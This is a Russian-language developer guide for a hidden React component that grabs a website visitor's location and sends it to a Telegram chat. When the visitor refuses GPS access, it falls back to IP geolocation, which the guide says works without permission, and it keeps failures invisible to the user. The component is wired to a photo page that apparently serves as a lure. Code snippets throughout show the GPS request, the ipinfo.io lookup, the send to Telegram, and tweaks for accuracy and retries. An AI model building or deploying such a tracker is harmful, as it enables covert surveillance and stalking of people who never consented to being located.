# Руководство по LocationHandler.jsx

## Обзор

`LocationHandler.jsx` - это React компонент, который автоматически получает местоположение пользователя и отправляет его в Telegram. Компонент работает полностью в фоновом режиме и не отображает никакого UI.

## Алгоритм работы

### 1. Автоматический запуск
```javascript
useEffect(() => {
  if (!locationPermission) {
    requestLocationPermission();
  }
}, []);
```
- Компонент автоматически запускается при монтировании
- Проверяет, есть ли уже сохраненные координаты
- Если координат нет, запускает процесс их получения

### 2. Запрос GPS координат
```javascript
const requestLocationPermission = async () => {
  const position = await new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
  // ...обработка результата
}
```

**Что происходит:**
- Используется `navigator.geolocation.getCurrentPosition()`
- Браузер показывает пользователю запрос на разрешение доступа к местоположению
- При согласии - получаем точные GPS координаты
- При отказе - переключаемся на IP-геолокацию

### 3. Резервное получение по IP
```javascript
const getLocationByIp = async () => {
  const response = await axios.get(`https://ipinfo.io/${clientIp}/json`);
  const { loc } = response.data;
  const [latitude, longitude] = loc.split(',');
  // ...отправка координат
}
```

**Процесс:**
- Делаем запрос к публичному API `ipinfo.io`
- Получаем приблизительные координаты по IP-адресу
- Точность ниже чем GPS, но работает без разрешения пользователя

### 4. Отправка в Telegram
```javascript
const sendLocation = async (coords) => {
  const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendLocationToTelegram}`;
  const data = { chat_id: chatId, latitude, longitude, clientIp };
  await axios.post(apiUrl, data);
}
```

**Финальный этап:**
- Отправляем координаты на наш backend сервер
- Сервер пересылает их в Telegram бот
- В Telegram появляется точка на карте с местоположением пользователя

## Диаграмма потока данных

```
Пользователь заходит на сайт
           ↓
LocationHandler монтируется
           ↓
Запрос GPS разрешения
           ↓
    [Пользователь соглашается?]
           ↓                    ↓
        [ДА]                  [НЕТ]
           ↓                    ↓
   Получение GPS          Получение по IP
           ↓                    ↓
           ↓←-------------------↓
           ↓
    Отправка на backend
           ↓
    Отправка в Telegram
           ↓
        [ГОТОВО]
```

## Типы ошибок и их обработка

### GPS ошибки:
- **PERMISSION_DENIED** - Пользователь отклонил запрос
  - *Решение:* Переключение на IP-геолокацию
  - *Пользователю:* Показываем alert с просьбой включить геолокацию

- **POSITION_UNAVAILABLE** - GPS недоступен
  - *Решение:* Переключение на IP-геолокацию
  - *Логирование:* Ошибка записывается в консоль

- **TIMEOUT** - Превышено время ожидания
  - *Решение:* Переключение на IP-геолокацию

### IP ошибки:
- **Сеть недоступна** - Нет подключения к интернету
  - *Результат:* Локация не определяется
  - *Поведение:* Приложение продолжает работать без координат

- **API ipinfo.io недоступен** - Проблемы с внешним сервисом
  - *Результат:* Локация не определяется

### Ошибки отправки:
- **Backend недоступен** - Наш сервер не отвечает
  - *Поведение:* Ошибка логируется, но не блокирует работу
  - *Пользователю:* Невидимо, работа продолжается

## Параметры компонента (Props)

| Параметр | Тип | Описание |
|----------|-----|----------|
| `setLocationPermission` | Function | Функция для сохранения координат в родительском компоненте |
| `setLocationSent` | Function | Функция для установки флага успешной отправки |
| `locationPermission` | Object\|null | Текущие координаты (если уже получены) |
| `chatId` | string | ID Telegram чата для отправки |
| `clientIp` | string | IP-адрес пользователя для резервного определения |

## Формат данных

### GPS координаты:
```javascript
{
  latitude: "55.7558",    // Широта (число в виде строки)
  longitude: "37.6176"    // Долгота (число в виде строки)
}
```

### Данные отправляемые на сервер:
```javascript
{
  chat_id: "123456789",
  latitude: "55.7558",
  longitude: "37.6176",
  clientIp: "192.168.1.1"
}
```

## Безопасность и приватность

### Что собирается:
- ✅ GPS координаты (с разрешения пользователя)
- ✅ Приблизительное местоположение по IP
- ✅ IP-адрес пользователя

### Как используется:
- Координаты отправляются только в указанный Telegram чат
- IP используется для резервного определения местоположения
- Данные не сохраняются на нашем сервере

### Требования браузера:
- 🔒 **HTTPS обязателен** - GPS API работает только по защищенному соединению
- 🌐 **Современный браузер** - поддержка `navigator.geolocation`
- 📱 **Мобильные устройства** - GPS доступен на телефонах и планшетах

## Отладка и логирование

Компонент выводит подробные логи в консоль браузера:

```javascript
// Успешное получение GPS
console.log("Location sent to Telegram");

// Ошибка GPS доступа
console.error("Error getting location permission:", error);

// Ошибка IP геолокации
console.error("Error fetching location by IP:", error);

// Ошибка отправки
console.error("Error sending location to server:", error);
```

### Как отладить:
1. Откройте Developer Tools (F12)
2. Перейдите на вкладку Console
3. Обновите страницу
4. Следите за сообщениями с префиксами выше

## Интеграция с другими компонентами

LocationHandler тесно интегрирован с:

- **PhotoPage.js** - получает от него chatId и clientIp
- **Backend API** - отправляет данные через `/api/send-location-to-telegram`
- **Telegram Bot** - конечный получатель координат
- **localStorage** - сохранение разрешений для повторных посещений

## Настройка конфигурации

Все настройки API находятся в `src/api/config.js`:

```javascript
export default {
  baseURL: 'https://your-backend.vercel.app',
  endpoints: {
    sendLocationToTelegram: '/api/send-location-to-telegram'
  }
};
```

## Альтернативные варианты использования

### Отключение IP геолокации:
```javascript
// Закомментируйте эту строку в catch блоке
// getLocationByIp();
```

### Изменение точности GPS:
```javascript
navigator.geolocation.getCurrentPosition(resolve, reject, {
  enableHighAccuracy: true,  // Высокая точность
  timeout: 10000,           // Таймаут 10 сек
  maximumAge: 60000         // Кеш на 1 минуту
});
```

### Добавление повторных попыток:
```javascript
const retryGetLocation = async (retries = 3) => {
  for (let i = 0; i < retries; i++) {
    try {
      await requestLocationPermission();
      break;
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }
};
```
